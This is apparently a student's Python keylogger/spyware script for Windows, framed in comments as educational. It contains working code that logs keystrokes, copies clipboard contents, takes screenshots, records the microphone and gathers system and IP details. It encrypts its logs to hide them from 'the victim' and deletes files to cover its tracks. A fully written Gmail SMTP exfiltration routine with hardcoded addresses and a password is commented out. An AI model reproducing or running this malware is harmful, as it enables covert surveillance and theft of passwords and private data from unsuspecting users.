#IMPORTANT: STARTING JANUARY 2025, GOOGLE STOPPED SUPPORTING LESS SECURE APP ACCESS SO EMAIL FUNCTION CAN NO LONGER WORK
#its a shame because it was so cool :(

'''
#libraries for email features
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
'''

#default libraries for collecting computer information
import socket
import platform

import win32clipboard

#to capture keystrokes
from pynput.keyboard import Key, Listener

import time
import os

#importing modules for mic
from scipy.io.wavfile import write
import sounddevice as sd

#to encrypt files
from cryptography.fernet import Fernet

import getpass
from requests import get

#for screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab


keys_information = "key_log.txt" #file for logged keys information
system_information = "systeminfo.txt" #file for system information
clipboard_information = "clipboard.txt" #file for clipboard information
audio_information = "audio.wav" #file for audio information
screenshot_information = "screenshot.png" #file for screenshot information

#encrypted version of our text files - would name the file differently if this program wasn't for educational purposes lol
keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

microphone_time = 10 #number of seconds we want mic to record
time_iteration = 15 #interval period for information gathering
number_of_iterations_end = 3 #number of loop iterations

key = "zcRoNqGOQi1gt-RhLadAWROlcEoEJJBBhauHRNctpvI=" #generate an encryption key from the cryptography folder, to change just run generate key file again

file_path = "C:/Users/ritzr/PycharmProjects/keylogger/project"
extend = "/" #to add keylogger file to file path
file_merge = file_path + extend


'''
IMPORTANT: STARTING JANUARY 2025, GOOGLE STOPPED SUPPORTING LESS SECURE APP ACCESS SO EMAIL FUNCTION CAN NO LONGER WORK
its a shame because it was so cool :(

email_address = "keyloggerproject@gmail.com" #disposable email here, address from where we send the email
password = "hackedhehe" #email password here
username = getpass.getuser()
toaddr = "keyloggerproject2025@gmail.com" #email address you want to send your information to

#email controls
#adding email functionality: sending the logged keys file as an email - ref is gfg
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart() #function to help create and send emails with attachments

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger Log File"

    body = "EMAIL BODY - nothing to add as of now"
    msg.attach(MIMEText(body, 'plain')) #attaching body to message

    filename = filename #attached file name
    attachment = open(attachment, 'rb') #opening and reading attachment in binary
    p = MIMEBase('application', 'octet-stream') #some default settings

    #encoding message
    p.set_payload((attachment).read())
    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename= %s" % filename) #adding header
    msg.attach(p) #attaching message

    s = smtplib.SMTP('smtp.gmail.com', 587) #creating SMTP (simple mail transfer protocol) session, port to access gmail is 587
    s.starttls() #creating tls (transport layer security, cryptographic protocol to provide communications security over a network)

    s.login(fromaddr, password) #logging into gmail account
    text = msg.as_string() #converting multipart message into a string to make sure we can send it
    s.sendmail(fromaddr, toaddr, text) #sending the mail with file attached

    s.quit() #quitting smtp session

send_email(keys_information, file_path + extend + keys_information, toaddr)
'''


#to get the computer information, uses multiple imported modules
def computer_information():
    with open(file_path + extend + system_information, "a") as f: #initially creates then appends onto file
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname) #getting IP address
        try:
            public_ip = get("https://api.ipify.org").text #to get public IP address and converting to text
            f.write("\nPublic IP Address: " + public_ip) #appending public IP to system information file

        except Exception: #because api.ipify stops working / blocks us after 3 accesses
            f.write("Could not get Public IP Address (most likely max query)")

        #using platform module to get more information
        f.write("\nProcessor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

#to get the clipboard content
def copy_clipboard(): #uses win32 sub-module
    with open(file_path + extend + clipboard_information, "a") as f: #initially creates then appends onto file
        try: #only appending strings from clipboard
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("\nClipboard Data: \n" + pasted_data)
        except: #when an image/audio/document file is copied
            f.write("Clipboard could be not be copied")

copy_clipboard()

#to get the microphone
def microphone():
    fs = 44100 #sampling frequency, 44100 hz is most common
    seconds = microphone_time #amount of seconds we wish to record
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2) #to record
    sd.wait()
    write(file_path + extend + audio_information, fs, myrecording) #writing audio information we get onto a wav file

#microphone() #set to record for 10s, can change it using basic variable above

#to get screenshots
def screenshot():
    im = ImageGrab.grab() #grabbing image
    im.save(file_path + extend + screenshot_information) #saving image to png file we have created

screenshot()

#adding timer so that all information including keylogging is taken at regular intervals (can't just have one screenshot or cannot run file again and again)
i = 0 #initialization, to set no. of iterations see basic variables above
currentTime = time.time() #getting current time
stoppingTime = time.time() + time_iteration #time specified in basic variable above, time to stop = current time + one time period

#timer for keylogger
while i < number_of_iterations_end:

    #basic keylogger starts
    count = 0
    keys = [] #each key is appended to list

    def on_press(key):
        global keys, count, currentTime #global variables

        print(key)
        keys.append(key)
        count = count + 1
        currentTime = time.time() #getting time every time a key is pressed

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f: #initially creates then appends onto file
            #making keylog file readable
            for key in keys:
                k = str(key).replace("'","") #each key is in single quotes so we just remove the quotes
                if k.find("space") > 0: #creating a new line for each word
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key): #to exit keylogger on pressing esc/when iterations get over
        if key == Key.esc:
            return False
        if currentTime > stoppingTime: #exit condition to take keys from log file and send it to email + exit keylogger
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    #basic keylogger ends

    if currentTime > stoppingTime: #taking screenshots and clipboard information periodically
        with open(file_path + extend + keys_information, "w") as f:
            f.write(" ") #getting a clean file / removing previous logs

        screenshot()
        #send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)

        copy_clipboard()

        i = i + 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration
        #timer function ends here

    #encrypting files (to not let victim find what we are doing)
    files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information] #encrypting our text files
    encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e] #to easily access file names while encrypting them

    count = 0

    for encrypting_file in files_to_encrypt: #encrypting all files in list
        with open(files_to_encrypt[count], 'rb') as f: #opening and reading file (rb is reading binary, a is appending data)
            data = f.read()

        #adding encryption
        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[count], 'wb') as f: #wb is write binary
            f.write(encrypted) #adding encrypted file/appending encrypted to new file

        #send_email(encrypted_file_names[count], encrypted_file_names[count], toaddr)
        count = count + 1

    time.sleep(120) #so that emails are sent properly

    #to clean up our tracks and delete files
    delete_files = [system_information, clipboard_information, keys_information, screenshot_information, audio_information]
    for file in delete_files:
        os.remove(file_merge + file)